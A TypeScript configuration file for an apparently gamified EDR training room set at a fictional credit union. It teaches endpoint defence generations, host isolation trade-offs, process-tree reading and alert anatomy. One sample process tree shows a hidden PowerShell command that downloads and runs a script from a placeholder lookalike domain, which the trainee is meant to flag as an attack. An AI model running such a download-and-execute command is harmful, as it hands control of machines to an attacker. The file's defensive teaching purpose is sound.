import type { RoomExperience } from "./types";

// "Operation Black Box" for the "endpoint-security-fundamentals" room.
// Script: docs/campaign/17-endpoint-security-fundamentals.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Kestrel Credit Union (fictional). Lab data differs from the graded tasks: the
// generation sort uses incidents, not definitions (q1, q4); the live-response
// session and the isolation queue work other hosts than q3's spreading laptop;
// the process trees avoid q2's winword > cmd > powershell -Enc chain; and the
// alert drill is a Microsoft Defender alert, not la1's Falcon PowerShell
// detection or its flags (la1, f1).
export const ENDPOINT_SECURITY_FUNDAMENTALS: RoomExperience = {
  roomId: "endpoint-security-fundamentals",
  codename: "Operation Black Box",
  theme: "edr",
  handler: { name: "Hana Kobayashi", role: "EDR Engineer, Kestrel Credit Union" },
  briefing: [
    "Kestrel Credit Union. 2,400 laptops, 380 servers, and an EDR agent on every one of them.",
    "Each agent is a flight recorder: every process, file, connection and registry change, streamed to the cloud.",
    "Hana Kobayashi runs the EDR platform. When an alert fires, she doesn't guess. She opens the recording.",
    "Learn what each generation of endpoint defence catches, drive a live response shell, decide when isolation is worth its cost, and read an alert like she does.",
  ],
  mission: "Tell AV, NGAV, EDR and XDR apart by what they catch, contain a spreading infection host by host, choose between isolation and lighter containment, read process trees, and take apart a Defender alert field by field.",
  estimate: "~45 min",
  look: { primary: "#34d399", secondary: "#60a5fa", warn: "#f43f5e" },
  scene: "blackbox",
  layout: "stage",
  stations: [
    {
      id: "gens",
      label: "Four Generations",
      topic: "Signature AV · NGAV · EDR · XDR",
      tagline: "Which generation would have caught each attack?",
      building: "archive",
      taskIds: ["ep-sec-r1", "ep-sec-q1", "ep-sec-q4"],
    },
    {
      id: "recorder",
      label: "The Flight Recorder",
      topic: "EDR telemetry · live response · isolation and what it costs",
      tagline: "Scan first, then decide what to isolate",
      building: "control",
      taskIds: ["ep-sec-r2", "ep-sec-q3"],
    },
    {
      id: "tree",
      label: "Read the Tree",
      topic: "A seven-step method for any EDR alert · process trees · command lines",
      tagline: "Tell admin tooling from an attack by who launched what",
      building: "lab",
      taskIds: ["ep-sec-r3", "ep-sec-q2"],
    },
    {
      id: "alert",
      label: "The Alert",
      topic: "Reading a real Falcon detection end to end",
      tagline: "Read the detection the way Hana would",
      building: "ticket",
      taskIds: ["ep-sec-la1", "ep-sec-f1"],
      boss: true,
    },
  ],
  personas: {
    "ep-sec-q1": { name: "Hana Kobayashi", role: "EDR Engineer", line: "The board asks why we replaced antivirus. One sentence." },
    "ep-sec-q2": { name: "Hana Kobayashi", role: "EDR Engineer", line: "Word, then cmd, then encoded PowerShell. What am I looking at?" },
    "ep-sec-q3": { name: "Hana Kobayashi", role: "EDR Engineer", line: "It's spreading from that laptop right now. First move?" },
    "ep-sec-q4": { name: "Hana Kobayashi", role: "EDR Engineer", line: "And XDR. What does it add?" },
  },
  briefings: {
    // ── Reading 1: four generations ──
    "ep-sec-r1": [
      {
        kind: "duel",
        title: "Four Generations, Five Attacks",
        prompt: "Hana pulls five old Kestrel incidents out of the archive. Each attacker move is one the board asked about. Play the one defence that would really have stopped it, and remember a played card is gone.",
        attacker: "The Kestrel intruders",
        moves: [
          { id: "m1", move: "A banking trojan, unchanged for years, on a USB stick", detail: "A teller plugs in a stick from home. The file has the same bytes it has had since 2021.", counter: "sig", hint: "The bytes are already known. The oldest tool is enough.", why: "An exact, known file is what a signature database is built for. A weekly scan would find it days too late, and nothing here needs a recording or a model." },
          { id: "m2", move: "Never-seen ransomware starts renaming files in bulk", detail: "No hash on any list. Hundreds of files per minute are being renamed and rewritten on one share.", counter: "beh", hint: "There is no signature, but the speed of the renames is a pattern.", why: "Bulk rename and rewrite is a behaviour NGAV blocks as it happens, with no prior knowledge of the file. Signatures cannot help with something new." },
          { id: "m3", move: "Code runs only in memory, inside a trusted process", detail: "No new file on disk. The code lives inside a legitimate, signed program.", counter: "mem", hint: "Nothing on disk means nothing to scan there.", why: "Memory scanning and exploit prevention are NGAV features that look at what is running, not at files. A disk scan of this host would come back clean." },
          { id: "m4", move: "Three weeks of built-in admin tools, noticed only later", detail: "Every tool is signed and normal. Nothing was ever blocked and the intruder was found by chance.", counter: "rec", hint: "Nothing to block at any moment, so you need yesterday's evidence.", why: "Only a recording of every process, connection and file lets you hunt backwards and rebuild the intrusion. A new scan sees only signed tools and finds nothing wrong." },
          { id: "m5", move: "A phish, a stolen sign-in token, then a bulk download from the cloud drive", detail: "The laptop looks fine. The mail, the identity provider and the cloud drive each hold one piece.", counter: "xdr", hint: "Three different data sources, one story.", why: "Email, identity and cloud are separate domains, and XDR joins them into one incident. Blocking the sender domain only stops the next mail, and the stolen token is already in use." },
        ],
        cards: [
          { id: "sig", name: "Signature scan on file write", effect: "Matches the file against known-bad hashes the moment it lands." },
          { id: "beh", name: "Block bulk file changes in progress", effect: "Stops a process that renames and rewrites files at ransomware speed." },
          { id: "mem", name: "Memory scan and exploit prevention", effect: "Inspects running code and injected memory instead of disk files." },
          { id: "rec", name: "Hunt through recorded process history", effect: "Replays what ran, who launched it and where it connected." },
          { id: "xdr", name: "Join mail, identity and cloud alerts", effect: "Stitches signals from separate domains into one incident." },
          { id: "scan", name: "Weekly full-disk scan", effect: "Scans every file on every laptop once a week." },
          { id: "gate", name: "Block the sender domain at the mail gateway", effect: "Rejects future mail from one sender domain." },
        ],
        lesson: "Each generation earns its place by what it can see. Signatures know old files, NGAV judges behaviour and memory, EDR keeps the recording you hunt through, and XDR joins separate domains. The scan and the gateway rule are real controls, but neither one stops these moves.",
      },
    ],
    // ── Reading 2: the flight recorder ──
    "ep-sec-r2": [
      {
        kind: "outbreak",
        title: "Contain the Spread",
        prompt: "The loan floor at Kestrel's Leeds branch. The updater that Hana found in a Temp folder on one laptop is moving between machines toward the loans server. Isolate one laptop a turn and see what each decision saves.",
        hostPrefix: "KCU",
        cols: 6,
        rows: 5,
        crown: "LOANS",
        via: "the same admin account on every laptop",
        lesson: "Isolation is a trade: it stops the spread and it stops that person working, so you spend it where it protects the most. On one host, live response may be enough: find the process that runs from a user Temp folder, match its PID to the outside address it holds open, then kill it and keep the host online. The moment the process has reached other hosts, kill is too light, and network containment is worth the outage.",
      },
      {
        kind: "queue",
        title: "Isolate, or Something Lighter?",
        prompt: "Four hosts with suspicious activity. Isolation is one click, and it's also an outage. Choose for each one.",
        console: "Falcon · containment decisions · Kestrel CU",
        actions: [
          { id: "iso", label: "Network-contain now", tone: "contain" },
          { id: "light", label: "Lighter action first", tone: "escalate" },
        ],
        alerts: [
          { id: "fs", time: "02:14", severity: "Critical", rule: "Ransomware: mass file encryption", entity: "KCU-FS-02 (branch file server)",
            fields: [{ k: "files renamed", v: "18,400 in 6 min" }, { k: "extension", v: ".kcux" }, { k: "spread", v: "SMB writes to 3 other hosts" }],
            context: "A file server encrypting shares and writing to other hosts right now.", answer: "iso", why: "Active spread beats any outage. Contain now, tell the owner after." },
          { id: "dc", time: "09:40", severity: "High", rule: "Suspicious LDAP enumeration", entity: "KCU-DC-01 (domain controller)",
            fields: [{ k: "source account", v: "svc_scanner" }, { k: "process", v: "powershell.exe (signed script)" }, { k: "spread", v: "none seen" }],
            context: "One service account running unusual directory queries on a domain controller.", answer: "light", why: "Isolating a DC breaks sign-in for the whole credit union. Disable svc_scanner and investigate first." },
          { id: "atm", time: "11:05", severity: "Medium", rule: "Unsigned binary executed", entity: "KCU-ATM-MON-03 (ATM monitoring PC)",
            fields: [{ k: "binary", v: "vendor_diag.exe" }, { k: "network", v: "no external connections" }, { k: "owner", v: "Branch Operations" }],
            context: "An unsigned tool on the PC that watches the branch ATMs.", answer: "light", why: "Business-critical, no spread, no C2. Call the owner, kill the process if needed, and check whether it's a vendor tool." },
          { id: "dev", time: "15:22", severity: "High", rule: "C2 beacon + credential dumping", entity: "KCU-LT-0912 (developer laptop)",
            fields: [{ k: "lsass access", v: "yes" }, { k: "beacon", v: "every 60 s to 203.0.113.77" }, { k: "user", v: "standard" }],
            context: "A laptop beaconing out after touching LSASS memory.", answer: "iso", why: "Confirmed compromise with stolen credentials in play: one person loses an afternoon, the credit union loses nothing." },
        ],
      },
    ],
    // ── Reading 3: reading an EDR alert ──
    "ep-sec-r3": [
      {
        kind: "evidence",
        title: "Who Launched What?",
        prompt: "Three PowerShell-related process trees from the same morning. The child process is similar in each; the parent tells you the story.",
        choices: [
          { id: "ok", label: "Legitimate administration" },
          { id: "bad", label: "Attack" },
        ],
        items: [
          {
            id: "sccm",
            caption: "Falcon · process tree · KCU-LT-0301",
            screen: { type: "edrtree", host: "KCU-LT-0301", verdict: "Script signed by Kestrel IT; same job ran on 2,388 hosts today", nodes: [
              { depth: 0, name: "CcmExec.exe", detail: "Configuration Manager client (SYSTEM)" },
              { depth: 1, name: "powershell.exe", detail: "-NoProfile -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\SystemTemp\\inventory.ps1" },
            ] },
            answer: "ok",
            callouts: [
              { at: "tree", text: "Bypass and NoProfile look alarming alone. Launched by the ConfigMgr client running a signed script from its own folder, they are routine." },
              { at: "verdict", text: "The same signed job on almost every laptop: fleet management, not an intrusion." },
            ],
          },
          {
            id: "hta",
            caption: "Falcon · process tree · KCU-LT-0457",
            screen: { type: "edrtree", host: "KCU-LT-0457", verdict: "Only host in the fleet with this chain; outbound to 198.51.100.150", nodes: [
              { depth: 0, name: "OUTLOOK.EXE", detail: "user r.patel" },
              { depth: 1, name: "mshta.exe", detail: "https://kestrel-docs.example/view/rate-sheet.hta", bad: true },
              { depth: 2, name: "powershell.exe", detail: "-w hidden -c IEX (iwr https://kestrel-docs.example/a.ps1)", bad: true },
              { depth: 3, name: "msupdate.exe", detail: "written to %TEMP%, started", bad: true },
            ] },
            answer: "bad",
            callouts: [
              { at: "tree", text: "Outlook launched an HTML application from a lookalike domain, which downloaded and ran a script in memory, which dropped an executable. Each hop is a red flag." },
              { at: "verdict", text: "One host, one time, talking to the address you found in live response." },
            ],
          },
          {
            id: "task",
            caption: "Falcon · process tree · KCU-SQL-01",
            screen: { type: "edrtree", host: "KCU-SQL-01", verdict: "Runs nightly at 02:00 for 2 years; change CHG-2291", nodes: [
              { depth: 0, name: "svchost.exe", detail: "Task Scheduler · \\Kestrel\\SQL-Index-Maintenance" },
              { depth: 1, name: "powershell.exe", detail: "-NonInteractive -File D:\\DBA\\Scripts\\reindex.ps1 (signed)" },
            ] },
            answer: "ok",
            callouts: [
              { at: "tree", text: "A named scheduled task running a signed DBA script: the expected parent for automation." },
              { at: "verdict", text: "Two years of history and a change ticket. Baselines turn a scary flag into a known job." },
            ],
          },
        ],
      },
    ],
    // Drill before the graded Falcon alert: a Defender alert, field by field.
    "ep-sec-la1": [
      {
        kind: "anatomy",
        title: "Anatomy of a Defender Alert",
        prompt: "Before the graded Falcon detection, read an alert from the other big EDR. Different names, same seven questions.",
        source: "Microsoft Defender XDR · advanced hunting · AlertInfo + AlertEvidence",
        fields: [
          { key: "Title", value: "Suspicious process injection observed", label: "What", note: "The detection name: step 1 of the method." },
          { key: "Severity", value: "High" },
          { key: "Category", value: "DefenseEvasion", label: "Tactic", note: "Defender's word for the ATT&CK tactic." },
          { key: "AttackTechniques", value: "[\"Process Injection (T1055)\"]", label: "Technique" },
          { key: "DetectionSource", value: "EDR", label: "Which engine", note: "EDR behavioural detection, not antivirus." },
          { key: "DeviceName", value: "kcu-lt-0622.kestrel.local", label: "Where", note: "Step 2: which machine, and what is its role?" },
          { key: "AccountName", value: "m.osei", label: "Who" },
          { key: "InitiatingProcessFileName", value: "rundll32.exe", label: "Parent", note: "Step 4: who launched what." },
          { key: "ProcessCommandLine", value: "rundll32.exe C:\\ProgramData\\vmsync\\vmsync.dll,DllRegisterServer", label: "Command line", note: "Step 3: a DLL from ProgramData, called by its export name." },
          { key: "SHA256", value: "3e9b7a0c41d2f85e6b17c09a4d38e2f1b5c6a7d80e9f1a2b3c4d5e6f70819a2b", label: "Hash", note: "Step 5: look it up in threat intel." },
          { key: "RemoteIP", value: "203.0.113.31", label: "Network evidence", note: "Step 6: follow-on activity." },
        ],
        summary: "Title, host, command line, parent, hash, follow-on: the same method works on any vendor. Now the graded Falcon detection.",
      },
    ],
  },
};
